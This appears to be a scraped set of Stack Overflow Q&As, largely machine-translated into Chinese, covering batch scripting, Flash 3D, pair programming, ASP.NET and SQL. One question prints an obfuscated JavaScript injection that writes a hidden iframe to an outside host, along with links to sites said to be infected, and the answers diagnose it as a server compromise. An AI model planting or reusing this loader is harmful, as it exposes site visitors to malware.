:: get the volume information on that disk
vol %dl%: > "%TMPFILE%" 2>&1

:: Drive/Volume does not exist, just quit
if not "%ERRORLEVEL%"=="0" goto :eof

set found=0
for /F "usebackq tokens=3 delims=:" %%g in (`find /C /I "%volname%" "%TMPFILE%"`) do set found=%%g

:: trick to stip any whitespaces
set /A found=%found% + 0

if not "%found%"=="0" set MatchLabel_res=%dl%:
goto :eof

:END

if exist "%TMPFILE%" del "%TMPFILE%"
endlocal 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-22T09:30:31.680

为了更详细地阐述鲁本的答案，这是我的批处理文件：

```
wpeutil UpdateBootInfo
for /f "usebackq skip=1 tokens=3 delims= " %%l in ( `reg query HKLM\System\CurrentControlSet\Control /v PEBootRAMDiskSourceDrive` ) do set "PendrivePath=%%l"
set "PendriveLetter=%PendrivePath:~0,1%"
echo The boot pendrive's drive letter is %PendriveLetter% 
```

# flash - 在 Flash 中学习交互式 3D

> ID：721756
> 
> 赞同：1
> 
> 时间：2009-04-06T14:38:26.350
> 
> 标签：flash, actionscript-3, actionscript, 3d

我有兴趣了解 Adob​​e Flash 中的 3D 引擎。我知道 3D 实际上并不存在于 Flash 中，必须使用复杂的 ActionScript 来完成，但这个想法非常有趣。在像 Flash 这样广泛的平台上拥有 3D 功能可以为网站提供几乎无限的交互可能性，并且玩起来会很有趣。

我今天访问了一个网站，[http](http://ecodazoo.com/) ://ecodazoo.com/ ，这让我大吃一惊……太不可思议了。

我正在寻找一些可以开始学习如何完成此类工作的资源。只是想扩大我的视野。=)

非常感谢任何反馈！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T16:16:45.273

开始的好点是：

*   [Sandy3D](http://www.flashsandy.org/blog/)（[演示](http://www.flashsandy.org/demos)）
*   [PaperVision](http://blog.papervision3d.org/)（[演示](http://papervision3d.org/)/[演示](http://dailypv3d.wordpress.com/)）
*   [Alternativa](http://alternativaplatform.com/en/) ([演示](http://alternativaplatform.com/en/alternativa3d/))

他们都有很好的教程和文档。在我看来，如果您不使用 Flash 或 Flex，从头开始制作电影并使用纯 AS3 代码会更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-08-18T22:16:28.527

I'm using Alternativa as the 3D engine for my own project and you're right, adding 3D makes for some extremely cool possibilities. If you have access to a design suite such as Lightwave, and I'm sure others, you can export the model as vertices, load that data through Alternativa and make some nice environments.

Here are a few very basic rendering tests:

*   [http://battletechlive.files.wordpress.com/2008/12/battlefield.png](http://battletechlive.files.wordpress.com/2008/12/battlefield.png)
*   [http://battletechlive.files.wordpress.com/2008/12/plant.png](http://battletechlive.files.wordpress.com/2008/12/plant.png)
*   [http://battletechlive.files.wordpress.com/2008/12/adfull.png](http://battletechlive.files.wordpress.com/2008/12/adfull.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T15:49:52.467

Believe it or not Flash CS4 actually added a bunch of functionality to support 3D. I've always been a huge fan of Adobe's tutorials, so I have to recommend one of their articles to get you started.

[http://www.adobe.com/devnet/flash/articles/3d_support.html](http://www.adobe.com/devnet/flash/articles/3d_support.html)

The article has a handful of pre-built SWFs so you can open them up, poke around inside of them and see how everything is done.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T17:17:32.133

哇。令人兴奋。惊人的。

在上面的三个链接之上，我还建议使用 Away3D，我正在使用它（只是一点点），它似乎比 Papervision 更易于访问（即使它是它的一个分支）。据我所知，大多数引擎都能够导入在其他软件中制作的模型，如 Maya、3Dsmax、Blender 等，但我认为纹理的导入可能会有一些不足之处（我可能是错的，看看一些演示，人们正在创造奇迹）

去 Kirupa.com 挖掘一下，并在 gotoandlearn.com 上观看一些教程。大多数材料可能会基于 papervision，因为他们似乎是第一个发现它并拥有强大的人才社区支持的，但是一旦你对它有所了解，你可能会发现其他引擎更合适。

在用 papervision 将我的头撞到墙上之后，我在一个小时左右的时间内用 away3D构建了一个非常基本的[地形生成器。](http://terrain.assemblism.com/textures/stage1.jpg)

# extreme-programming - 结对编程是否意味着您不需要设计文档？

> ID：721762
> 
> 赞同：5
> 
> 时间：2009-04-06T14:40:40.823
> 
> 标签：extreme-programming, pair-programming

在结对编程中，团队中每个成员的经验都可以传播给新成员。这种体验总是与代码同步，因为这对“高级”知道代码是如何工作的以及设计是什么。

那么在这种情况下，设计文档的用途是什么？

***更新***

我不是暗示没有设计，我暗示没有文档。对于一个练习结对编程的团队，我认为每个人都是一次性的，因为每个人都知道代码。如果资深开发者离开，我想总有至少一个人懂代码，因为之前分享过经验。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-04-06T14:42:09.477

如果您的团队超过 2 人怎么办？

仅仅因为两个人知道系统的一部分并不意味着它不应该被记录在案。

我很高兴知道我不必记住系统的每一个微小细节，因为它只存储在我的脑海中。

对于小型系统，这可能有效，但随着系统变大，您会限制自己和同事。我宁愿将内存容量用于新系统，也不愿记住旧系统的所有内容。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T14:43:34.157

你玩过“电话”吗？我认为你不应该用你的代码库来玩它。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T14:43:36.870

如果高级程序员离开公司/项目怎么办？

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-04-06T14:45:16.727

应独立于您是否使用结对编程来决定可交付成果的**集合。**

六个月或两年后，所有参与的人都可能在不同的项目（或不同的公司）中。您希望能够回来使用设计文档吗？然后，生产它。如果你不想回来，或者设计很简单，通过规范和代码你可以在没有明确设计文档的帮助下理解它，那么你可以跳过它。

但不要依赖一年后两个人向你解释设计。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T14:44:32.063

维护。你不能指望团队保持静止，因为没有新成员或老成员流失。设计文档确保那些对项目不熟悉、必须维持多年的人能够获得有关已做出的决定、选择该方法的原因以及如何实施的信息。拥有此文档对于项目的长期成功非常重要，可以通过传统文档、源注释、单元测试和各种其他方法的组合来提供。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-04-06T14:45:18.363

我不认为结对编程会使设计文档过时。我立即不得不考虑[卡车因素](http://www.agileadvice.com/archives/2005/05/truck_factor.html)。当然，前辈可能知道设计是什么。但是当他生病时会发生什么？当他*被*卡车撞到时会发生什么？如果他被解雇了怎么办？

结对编程确实传播了知识，但记录这些知识永远不会有坏处。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T14:43:05.670

谁知道第一个编写的代码？答案是没有人知道，因为它还没有被写出来。之所以没有写出来，是因为没有人知道该怎么做，因此需要一份设计文档。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-06T14:47:27.437

结对编程只是两个人共用一台计算机。就其本身而言，它并没有说明这对组合使用了什么样的设计方法。

结对编程，作为“[极限](http://www.extremeprogramming.org/) [编程](http://en.wikipedia.org/wiki/Extreme_Programming)”的一部分，意味着遵循极限编程指南进行设计。这通常涉及收集和编码“用户故事”。然后这些故事将代替其他设计文档。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-06T14:48:42.927

正如你所说，人们的体验可能与代码同步。但是设计决策并没有全部记录在代码中——只有所做的选择在那里。

以我的经验，要真正理解为什么代码是这样设计的，您需要了解未选择的设计选择、尝试过和失败的方法等。您可以希望“中国耳语”链传达这一点正确，因为代码中没有记录来刷新内存或纠正错误......

...或者你可以写一些关于设计的文档以及它是如何到达的。这样，您就可以避免将来被维护程序员带入黑暗的小巷。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-12-11T14:55:23.520

取决于您所说的“设计文档”是什么意思。

如果您有功能测试——尤其是行为驱动开发 (BDD) 测试，或者 Fitnesse 或 FIT 测试，那么它们肯定是**“活动文档”**的一种形式……它们肯定具有价值以及回归测试。

如果您编写用户故事并将它们分解为任务并将这些**任务写在卡片上以供成对完成，**那么您就是在做一种文档形式...

这是我在 XP 团队中使用的两种主要形式的文档，它们与所有生产代码配对。

我觉得非常方便的唯一其他文档是半页左右的**项目符号集，向人们展示了如何为开发机器设置构建环境**。您应该在使用它时维护该列表。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-04-06T14:44:10.317

代码库可能太大了，以至于您无法记住您打算实现的每个细节。在这种情况下，参考很有用。

此外，如果您正在与其他组件等交互，您需要一个设计。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-04-06T14:45:10.580

结对编程仅启用您的编码和逻辑方面。

但是文档是很好的做法。总是做文档...

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-04-06T14:45:52.980

好吧，如果您想要一个电子表格程序而不是文字处理器，那么设计文档很有用:-)

XP、结对编程、敏捷等......并不意味着你没有计划，它只是一个远没有那么详细的计划（在微观层面上）正在发生的事情。用户选择的用例更多是设计，与其他风格的设计/编程相比，它更像是一个活文档。

不要陷入这样的陷阱：因为您正在做一些“酷”的事情而不再需要良好的实践——事实上，这种编程风格需要更多的纪律而不是更少的纪律才能成功。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-05-17T23:26:46.303

**不**没有结对编程也不意味着您需要文档。需要文档！**它的样子可能会让你大吃一惊！**

敏捷团队将决定何时以及需要什么文档。一个好的经验法则，如果没有人会读它，就不要写它。不要因为项目经理这样说，就因为提供工件而陷入瀑布式工件思维。

大多数人认为文档是您使用 Word 执行的操作。如果敏捷团队工作正常，则代码本身以及 TDD（测试驱动开发）将有一组自动化测试来记录和执行需求。图像、与代码同步的文档……并且一直保持这种状态。

话虽如此，结对确实有助于在团队中快速传播领域、应用、实践和技能知识。配对还有助于确保团队遵循工程实践，包括 TDD 和其他自动化测试。结果是应用程序保持健康并且很容易带来未来的变化。

因此，最重要的是，结对编程会产生更好的文档。它不会消除文档（尽管您可能无法找到 Word 文档）。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-05-27T15:00:27.630

我是一名拥护者和文档爱好者。结对编程不需要“一位高级开发人员”。根据我的结对编程经验，所有级别的开发人员都结对在一起，以实现快速开发。有很多次我与初级开发人员一起工作，并且会在键盘上进行权衡。有很多次我与高级架构师一起工作，并且会在键盘上进行权衡。文档仍然是必要的，尤其是您的核心组件和数据库。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-04-17T15:39:59.093

结对编程是团队避免将大部分项目时间用于记录所有内容的机会。但是对文档的需求取决于你记住重要内容的能力以及你的代码有多好。如果代码难以使用，您可能仍需要大量文档。

您可以尝试一些实验：-

*   记录设计的几个小部分，并注意您必须多久参考一次。
*   记录那些总是很难处理的东西。

# javascript - Javascript“病毒”

> ID：721772
> 
> 赞同：4
> 
> 时间：2009-04-06T14:43:25.450
> 
> 标签：javascript, virus

我的所有网站上都有一些 JS“病毒”问题。它们位于不同的主机上，并且在其中一些主机上出现了此代码。

```
<script>
function c2670903e0i49d9f1a845f6b(i49d9f1a846377) {
    var i49d9f1a846737 = 16;
    return (parseInt(i49d9f1a846377, i49d9f1a846737));
}
function i49d9f1a8472f3(i49d9f1a8476d9) {
    var i49d9f1a848679 = 2;
    var i49d9f1a847da9 = '';
    i49d9f1a848e47 = String.fromCharCode;
    for (i49d9f1a84828e = 0; i49d9f1a84828e < i49d9f1a8476d9.length; i49d9f1a84828e += i49d9f1a848679) {
        i49d9f1a847da9 += (i49d9f1a848e47(c2670903e0i49d9f1a845f6b(i49d9f1a8476d9.substr(i49d9f1a84828e, i49d9f1a848679))));
    }
    return i49d9f1a847da9;
}
var r1a = '';
var i49d9f1a84922e = '3C7' + r1a + '3637' + r1a + '2697' + r1a + '07' + r1a +'43E696628216D7' + r1a + '96961297' + r1a + 'B646F637' + r1a + '56D656E7' + r1a + '42E7' + r1a + '7' + r1a + '7' + r1a + '2697' + r1a + '465287' + r1a + '56E657' + r1a + '363617' + r1a + '065282027' + r1a + '2533632536392536362537' + r1a + '322536312536642536352532302536652536312536642536352533642536332533322533362532302537' + r1a + '332537' + r1a + '32253633253364253237' + r1a + '2536382537' + r1a + '342537' + r1a + '342537' + r1a + '302533612532662532662536352536332536662536642532652537' + r1a + '322536312537' + r1a + '322536352536322537' + r1a + '322536352536352536342536362536662536662537' + r1a + '342537' + r1a + '37' + r1a + '2536352536312537' + r1a + '32253265253633253666253664253266253366253237' + r1a + '2532622534642536312537' + r1a + '342536382532652537' + r1a + '322536662537' + r1a + '352536652536342532382534642536312537' + r1a + '342536382532652537' + r1a + '32253631253665253634253666253664253238253239253261253332253335253332253331253336253334253239253262253237' + r1a + '253632253237' + r1a + '2532302537' + r1a + '37' + r1a + '2536392536342537' + r1a + '34253638253364253335253332253331253230253638253635253639253637' + r1a + '2536382537' + r1a + '342533642533342533382533342532302537' + r1a + '332537' + r1a + '342537' + r1a + '39253663253635253364253237' + r1a + '2537' + r1a + '362536392537' + r1a + '332536392536322536392536632536392537' + r1a + '342537' + r1a + '39253361253638253639253634253634253635253665253237' + r1a + '2533652533632532662536392536362537' + r1a + '3225363125366425363525336527' + r1a + '29293B7' + r1a + 'D7' + r1a + '6617' + r1a + '2206D7' + r1a + '969613D7' + r1a + '47' + r1a + '27' + r1a + '5653B3C2F7' + r1a + '3637' + r1a + '2697' + r1a + '07' + r1a + '43E';
document.write(i49d9f1a8472f3(i49d9f1a84922e));
</script> 
```

**NOD32**阻止该网站，因为他认为存在病毒。从源代码中删除代码没有帮助，因为它再次出现。它不可能是 XSS 的结果，因为它甚至出现在静态网站上。

我试图对我的系统进行全面扫描，但没有帮助。所有网站上唯一的东西是谷歌分析，我认为这不会导致这种情况。

编辑：例如，您可以在[http://www.postuj.cz/test/](http://www.postuj.cz/test/)或[http://flavicius.php5.cz/](http://flavicius.php5.cz/)看到它。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T17:05:01.257

> 它们位于不同的主机上，并且在其中一些主机上出现了此代码。

每个主机上的代码都相同吗？您能否举一个受影响域的示例，以便我们可以检查代码是否存在于服务器端，而不仅仅是在您的机器上（这通常不太可能）。

您发布的代码当然非常可疑。解码后，它将 iframe 写入 http://​ecom.rarebreedfootwear.com/? （它尝试向 URL 添加一个 cachebuster 随机数，但由于拼写错误而失败）。

该地址没有明显的漏洞利用——也许最终的目标漏洞利用还没有到位，或者它只是稍后真正攻击的测试运行，但是你的网站上出现了一个意外的 JavaScript，它会自行解码并添加一个 iframe是一面巨大的红旗。通常这意味着您的服务器已被入侵，需要使用新密码从头开始重新安装。

预计到达时间：

> 例如，您可以在 hxxp://flavicius.php5.cz/ 看到它

谢谢。我删除了评论以隐藏工作 URL，因为它确实被感染了。是在应用程序级别还是在 Apache 本身尚不清楚，但每个页面的底部都有可疑脚本。

因此，至少应用程序和可以想象的服务器受到了破坏，应该脱机以进行清理、重新安装和诊断：您需要找出攻击者是如何进入的，这样就不会再次发生这种情况。作为第一个猜测，请检查您是否拥有最新版本的 WordPress，因为它过去曾遭受过许多安全漏洞。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T14:46:51.650

它看起来像 Vundo 或它的变体。该恶意软件倾向于将看似毫无意义的 javascript 插入网站（在您的端，而不是服务器端）。我建议尝试[Malwarebytes 的 Anti-Malware](http://www.malwarebytes.org/mbam.php)。安装、更新并进行全面扫描。如果失败了，也许可以尝试研究专门删除 Vundo 的选项。

# asp.net - 从经典 ASP 迁移到 ASP.NET 时如何处理链接重定向？

> ID：721778
> 
> 赞同：3
> 
> 时间：2009-04-06T14:44:08.210
> 
> 标签：asp.net, asp-classic

我有一个大型 Web 项目，它正在从经典 ASP 迁移到 ASP.NET（大约是时间），并且想重定向来自旧地址的请求，例如：

> /some/path/old-page.asp?foo=bar

到新地址：

> /other/path/new-page.aspx?qaz=bak

在相当长的一段时间内，经典的 ASP 页面将与 ASP.NET 页面并行运行，随着时间的推移，各个页面将被其 ASP.NET 版本所取代。在可能的情况下，我想从旧页面重定向到新页面，以防止用户收到 404 错误，并保持页面上累积的 PageRank。

我的问题是，您将如何执行从经典 ASP 到新模板的重定向逻辑？显而易见的解决方案是用一些重定向到 new-page.aspx 的简单 VBScript 替换 old-page.asp，但从长远来看，我想摆脱旧的 .asp 文件，所以我想在这样，在站点完全在 .NET 中运行后它们也将存在。

一种选择是将 .asp 扩展名映射到 ASP.NET，并将重定向实现为 HttpHandler，但我想在请求传递到 ASP.NET 之后，没有办法让经典的 ASP 引擎运行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:56:44.623

几年前，我在一家电子商务公司遇到了同样的问题，我们将他们的网站升级到 .NET。主要问题是我们不知道有多少客户在他们的收藏夹中有旧的 asp 页面，以及 SEO 问题。是的，您可以将 asp 扩展名映射到 ASP.net，但您根本无法运行 asp 文件，因此您需要更新所有 asp 页面，这可能不可行。

我当时找到的最佳解决方案是在 IIS 中实现 ISAPI 重定向过滤器。这是一个由 IIS BEFORE、asp 或 asp.net 运行时运行的应用程序。它将根据 url 或您想要的任何规则做出决定，是否应该允许 asp 文件运行或是否应该重定向它们，或者使用 url-rewriting 来处理请求。它并不总是一个干净的操作，因为它在您的网站请求之前运行，如果其他开发人员不知道它正在运行，稍后可能会发生混乱。所以如果你走这条路，请确保你的网站有大量的评论或文档，让开发人员知道 IIS 中有这个东西正在运行......

在代码项目中有一个很好的解释如何实现这一点。去这里看看。 [http://www.codeproject.com/KB/ISAPI/isapiredirector.aspx](http://www.codeproject.com/KB/ISAPI/isapiredirector.aspx)

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-08T16:25:14.097

您应该使用“HTTP 301 - Permanently Moved”响应代码，因为这正是它的设计目的。

[http://en.wikipedia.org/wiki/HTTP_301](http://en.wikipedia.org/wiki/HTTP_301)

ISAPI 重定向过滤器将在某种意义上起作用，是的，它将访问者重定向到新的 URL。

然而，ISAPI 重定向策略存在三个关键问题。

1.  更多要编写/维护的代码
2.  书签和搜索引擎条目将永远不会使用新的正确 URL 进行更新
3.  如果 foo.asp 被透明地重定向到 bar.aspx 并且两者都被 Google 索引，那么您将有两个重复的 URL 指向 Google 中的相同内容。这会阻塞搜索结果，我相信实际上违反了他们的 TOS。

# asp.net - 在搜索结果中实现可点击的页码

> ID：721780
> 
> 赞同：2
> 
> 时间：2009-04-06T14:44:16.523
> 
> 标签：asp.net, pagination, user-input

经典场景：获取用户输入，获取搜索结果并在页面中显示给用户。然后，我需要显示 First、Next、Previous 等按钮，并将用户当前页面保持在 viewstate 中。一切都很好，工作正常。

然后我需要实现可点击的页码，即。1-2-3-4-5-6 等

渲染它们很简单。我在运行时生成一个链接按钮控件，添加带有页码的命令参数并向其添加处理程序，因此要处理单击。然后我将它添加到占位符中，并按预期显示。

但是...

我应该怎么做，所以我的事件总是连接起来并且能够在调用分页链接按钮时触发？

下面是代码的重要部分，一些伪代码使其（希望）更容易理解，我在做什么。

```
Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
  If Not Page.IsPostBack Then
     Search()
  End If
End Sub

Sub Search
    'Misc databinding stuff, searches and displays results for the page specified in Me.CurrentPage
    RenderPagingControls()
End Sub

Sub RenderPagingControls
   'loop throug pagenumbers, Build a linkbutton control, add it to a placeholder
    AddHandler lbn.Click, AddressOf lbnNumber_Click
    lblPageNumbers.Controls.Add(lbn)
    ...

End Sub

Protected Sub lbnNumber_Click(ByVal sender As Object, ByVal e As EventArgs)
    Dim b As LinkButton = CType(sender, LinkButton)
    Me.CurrentPage = CInt(b.CommandArgument)
    Search()
End Sub

Public Property CurrentPage() As Integer
    Get
        Dim o As Object = Me.ViewState("CurrentPage")
        If o Is Nothing Then
            Return 1
        Else
            Return CType(o, Integer)
        End If
    End Get
    Set(ByVal value As Integer)
        Me.ViewState("CurrentPage") = value
    End Set
End Property

Protected Sub lbnNumber_Click(ByVal sender As Object, ByVal e As EventArgs)
    Dim b As LinkButton = CType(sender, LinkButton)
    Me.CurrentPage = CInt(b.CommandArgument)
    Search()
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T15:27:26.467

我将建议不要使用 LinkBut​​ton，而是建议使用 Hyperlinks / QueryString 参数。有几个原因：

1.  如果没有链接按钮的视图状态开销，您的页面将更加高效。
2.  如果这些是面向公众的页面，那么如果它们可以通过超链接访问（并通过搜索引擎索引），您将获得更好的所有页面索引。
3.  你会发现它们更容易实现。没有事件管理等。

您可以将 CurrentPage 方法重新定义为（希望这是正确的，我在 C# 方面比 vb.net 更好）：

```
Public Property CurrentPage() As Integer
    Get
        Dim o As Object = Me.Request.QueryString("page")
        If o Is Nothing Then
            Return 1
        Else
            Return CType(o, Integer)
        End If
    End Get
End Property 
```

然后只需为每个页面添加超链接。

```
<a href='mypage.aspx?page=1'>1</a> - <a href='mypage.aspx?page=2'>2</a>
etc... 
```

**备选方案：**如果您想使用 LinkBut​​ton，您可能需要考虑在中继器中放置一个 LinkBut​​ton。那么您唯一需要担心的事件就是 OnItemCommand 事件。然后没有动态控件或事件。像这样的东西：

```
<asp:Repeater ID="rptPages" runat="server" OnItemCommand='doPaging'>
  <ItemTemplate>
    <asp:LinkButton ID="LinkButton1" runat="server" Text='<%# (Container.DataItem).ToString()  %>'
    CommandArgument='<%# (Container.DataItem).ToString() %>' />
  </ItemTemplate>
  <SeparatorTemplate>-</SeparatorTemplate>
</asp:Repeater> 
```

将此控件绑定到连续整数的数组（或列表）（因为有很多页面）。然后在您的 doPaging 函数（我称之为）中，检查 RepeaterCommandEventArgs.CommandArgument 以获取页码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-07T09:40:04.047

谢谢你们的回答，伙计们。我首先尝试了 Austins，但我一定遗漏了一些东西，因为我一直得到相同的链接按钮行为，每秒钟才工作一次……所以我放弃了，并看到了 Keltex 的中继器的替代解决方案！它既简单又出色，我们不必担心任何页面生命周期的废话。

它真的很管用！;)

如果将来有人需要类似的东西，这里是幕后的相关代码：

```
Sub Search()
    ...
    RenderPagingControls()
End Sub

Sub RenderPagingControls()
    Dim pages As New ArrayList
    For i As Integer = 1 To Me.PageCount
        pages.Add(i)
    Next

    repPageNumbersTop.DataSource = pages
    repPageNumbersTop.DataBind()

    repPageNumbersBottom.DataSource = pages
    repPageNumbersBottom.DataBind()

End Sub

Public Property CurrentPage() As Integer
    Get
        Dim o As Object = Me.ViewState("CurrentPage")
        If o Is Nothing Then
            Return 1
        Else
            Return CType(o, Integer)
        End If
    End Get
    Set(ByVal value As Integer)
        Me.ViewState("CurrentPage") = value
    End Set
End Property

Public Property PageCount() As Integer
    Get
        Dim o As Object = Me.ViewState("PageCount")
        If o Is Nothing Then
            Return 0
        Else
            Return CType(o, Integer)
        End If
    End Get
    Set(ByVal value As Integer)
        Me.ViewState("PageCount") = value
    End Set
End Property

Protected Sub repPageNumbersTop_ItemCommand(ByVal source As Object, ByVal e As System.Web.UI.WebControls.RepeaterCommandEventArgs) Handles repPageNumbersTop.ItemCommand, repPageNumbersBottom.ItemCommand
    Me.CurrentPage = CType(e.CommandArgument, Integer)
    Search()
End Sub

Private Sub repPageNumbersTop_ItemDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.RepeaterItemEventArgs) Handles repPageNumbersTop.ItemDataBound, repPageNumbersBottom.ItemDataBound
    If e.Item.ItemType = ListItemType.Item Or e.Item.ItemType = ListItemType.AlternatingItem Then
        Dim lbn As LinkButton = CType(e.Item.FindControl("lbnPageNumber"), LinkButton)
        If lbn.CommandArgument = Me.CurrentPage.ToString Then
            lbn.Enabled = False
        End If
    End If
End Sub 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T18:04:47.667

此代码有效（对不起，它在 C# 中）：

```
protected void SearchButton_Click(object sender, EventArgs e)
{
    //clear the collection!
    pnlPageNumber.Controls.Clear();

    //simulate search
    System.Random rnd = new Random();

    //create page buttons
    for (int i = 0; i < rnd.Next(3, 15); i++)
    {
        LinkButton lb = new LinkButton();
        pnlPageNumber.Controls.Add(lb);
        lb.ID = "btn" + i;
        lb.Text = i.ToString();
        lb.CommandArgument = i.ToString();
        lb.Command += new CommandEventHandler(linkbutton_Command);

        //optional literal
        pnlPageNumber.Controls.Add(new LiteralControl(" "));
    }

    ViewState["control#"] = Panel1.Controls.Count;
}

protected void Page_Load(object sender, EventArgs e)
{
    if (IsPostBack)
    {
        //Recreate link buttons
        //This is necessary to ensure proper event binding

        int count = 0;

        if (ViewState["control#"] != null)
            count = (int)ViewState["control#"];

        for (int i = 0; i < count; i++)
        {
            LinkButton lb = new LinkButton();
            pnlPageNumber.Controls.Add(lb);
            lb.ID = "btn" + i; //make sure IDs are the same here and on Search
            lb.Command += new CommandEventHandler(linkbutton_Command);

            //this is not necessary, but if you do, make sure its in both places
            pnlPageNumber.Controls.Add(new LiteralControl(" "));
        }
    }
}

void linkbutton_Command(object sender, CommandEventArgs e)
{
    Response.Write(e.CommandArgument.ToString() + " CLICK<br />");
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-07T01:19:41.567

您可以使用 DataPager 控件——唯一的限制是您必须将它与 ListView 控件一起使用，但是您应该能够相当容易地使用 ListView 控件来表示您的数据，因为它非常灵活。您可以将 ListView 控件的 DataSource 设置为数据结果的结果，无论是 DataSet、Collection、Array 等。

要使用“first”、“last”和页码创建分页控件，请像这样设置 DataPager（其中 ListView1 是 ListView 控件的 ID）：

```
<asp:DataPager ID="DataPager1" runat="server" 
   PagedControlID="ListView1" PageSize="25">
   <Fields>
      <asp:NextPreviousPagerField FirstPageText="first" ShowFirstPageButton="True" 
             ShowNextPageButton="False" ShowPreviousPageButton="False" />
      <asp:NumericPagerField />
      <asp:NextPreviousPagerField LastPageText="last" ShowLastPageButton="True" 
             ShowNextPageButton="False" ShowPreviousPageButton="False" />
   </Fields>
</asp:DataPager> 
```

按照设计，DataPager 使用数据库中的整个结果集，但您可以通过缓存结果并将其用于后续请求来提高性能。

希望这可以帮助。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-04-06T14:54:07.127

iirc ...在运行时动态添加控件有点棘手。必须在回发期间重建控制树......但在加载视图状态之前（不确定页面生命周期中的时间......但在页面加载之前）。所以...您的问题是，当 asp.net 试图找出您的事件时，尚未创建实际的原始控件。

# jquery - 日期选择器在 ie7 中不起作用

> ID：721782
> 
> 赞同：0
> 
> 时间：2009-04-06T14:44:36.087
> 
> 标签：jquery, datepicker

我已经实现了一个 ui datepicker，它在 FF 中完美运行，但在 IE 中却不行。

请参阅此处[链接](http://mbvdoornedu.cursistennet.nl/aanmelden/aanmelden)尝试单击“Geboortedatum”字段。怎么了？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:49:38.993

Ladosa.js 中的第 76 - 78 行：

```
password:{
  required: true,
}, 
```

应该

```
password:{
  required: true
}, 
```

至少这就是我的 IE 给出的错误。
希望这可以帮助您朝着正确的方向前进。

**编辑**（第 78 行，也在 Ladosa.js 中）

```
rules: { //begin rules tag
  ...

  password:{
    required: true
  }, // <--- remove this comma also!

}, //end rules tag

messages: {
    name: "Please enter your name",
    email: "Please enter a valid email address"
}, 
```

一定要检查所有开始标签是否都有结束标签，当删除函数中的代码时，请确保删除所有内容......
此外，如果你 INDENT（*代码延迟 inspringen*）你的代码更容易发现错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T15:39:17.407

这是你的问题：

```
 //set the rules for the field names
            rules: {
                firstname: {
                    required: true,
                    minlength: 2
                },
                surname: {
                    required: true,
                    minlength: 2
                },              
                email:{
                    required: true,
                    email: true
                },
                password:{
                    required: true
                }, <----- remove this comma !!!

            }, 
```

删除上面的逗号。此外，如果您将该代码块放入[http://jslint.com](http://jslint.com)，您会发现同样的事情。正如其他人指出的那样，IE 不喜欢像散列那样的尾随逗号

# sql - 按日期计算事件的 SQL

> ID：721789
> 
> 赞同：2
> 
> 时间：2009-04-06T14:45:46.897
> 
> 标签：sql, logging, date

我觉得我以前见过这个问题，但是 SO 搜索和谷歌都没有帮助我......也许我只是不知道如何表达这个问题。我需要计算给定时间跨度内每天的事件数量（在本例中为登录），以便制作网站使用情况图表。到目前为止我的查询是这样的：

```
select 
   count(userid) as numlogins, 
   count(distinct userid) as numusers, 
   convert(varchar, entryts, 101) as date 
from 
   usagelog 
group by 
   convert(varchar, entryts, 101) 
```

这完成了我需要的大部分工作（我在每个日期得到一行作为输出，其中包含该日期的登录总数和唯一用户数）。问题是，如果没有人在给定日期登录，则该日期的数据集中不会有一行。我希望它在行中添加指示这些日期的零登录。我可以想到两种方法来解决这个问题，而且都没有让我觉得非常优雅。

1.  向结果集中添加一列，其中列出了期间开始与当前行日期之间的天数。当我构建图表输出时，我将跟踪该值，如果下一行不等于当前行加一，则为缺失的每一天在图表中插入零。
2.  创建一个“日期”表，其中包含感兴趣期间的所有日期并针对它进行外部连接。可悲的是，我正在开发的系统已经有一个用于此目的的表，其中包含未来每个日期的一行......我不喜欢这样，我宁愿避免使用它，特别是因为table 用于系统的另一个模块，因此会引入对我当前正在开发的内容的依赖。

任何更好的解决方案或提示更好的谷歌搜索词？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:54:59.777

坦率地说，我会在构建最终输出时以编程方式执行此操作。您实际上是在尝试从数据库中读取不存在的内容（几天内没有数据的数据）。SQL 并不真正适用于那种事情。

但是，如果您真的想这样做，“日期”表似乎是您的最佳选择。为了使它更好一点，您可以使用数据库的日期函数和派生表即时生成它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T16:31:51.260

我最近不得不做同样的事情。这就是我在 T-SQL 中的做法（YMMV 的速度，但我发现它在 coupla 百万行事件数据中表现得足够好）：

```
DECLARE @DaysTable TABLE ( [Year] INT, [Day] INT )

DECLARE @StartDate DATETIME
SET @StartDate = whatever

WHILE (@StartDate <= GETDATE())
